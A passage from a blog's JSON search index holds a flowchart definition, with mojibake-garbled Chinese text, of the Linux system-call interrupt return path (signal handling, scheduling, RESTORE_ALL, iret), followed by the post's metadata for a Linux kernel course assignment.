æ˜¯å¦æœ‰å…¶ä»–ä¿¡å·æˆ–è°ƒåº¦\rio=\u0026gt;inputoutput: å¤„ç†å…¶ä»–ä¿¡å·|future\rcond2=\u0026gt;condition: æ˜¯å¦æœ‰è°ƒåº¦ä¿¡å·\rop4=\u0026gt;operation: call_scheduleï¼ˆè¿›ç¨‹è°ƒåº¦ï¼‰\rop5=\u0026gt;operation: RESTORE_ALL(æ¢å¤ç°åœº)\rop6=\u0026gt;operation: INTRRRUPT_RET(iret)\rè¿”å›ç”¨æˆ·è¿›ç¨‹\rop7=\u0026gt;operation: ä¿å­˜ä¸­æ–­ï¼Œè°ƒç”¨ä¸Šä¸‹æ–‡ï¼Œè°ƒåº¦\rop8=\u0026gt;operation: æœªæ¥å†è°ƒåº¦å›æ¥\rcond3=\u0026gt;condition: æ˜¯å¦æœ‰é€€å‡ºä¿¡å·\rst-\u0026gt;op1-\u0026gt;op2-\u0026gt;op3-\u0026gt;cond1\rcond1(no,lift)-\u0026gt;op5-\u0026gt;op6\rcond1(yes,right)-\u0026gt;io-\u0026gt;cond3(no)-\u0026gt;cond2(yes)-\u0026gt;op4-\u0026gt;op7-\u0026gt;op8\rop8(right)-\u0026gt;op5\rcond2(no,right)-\u0026gt;op5\r","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"339107ff6b8896c9a8df3f6d35283479","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-interrupt/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-interrupt/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬äº”å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹5_System callä¸­æ–­å¤„ç†è¿‡ç¨‹","type":"post"}]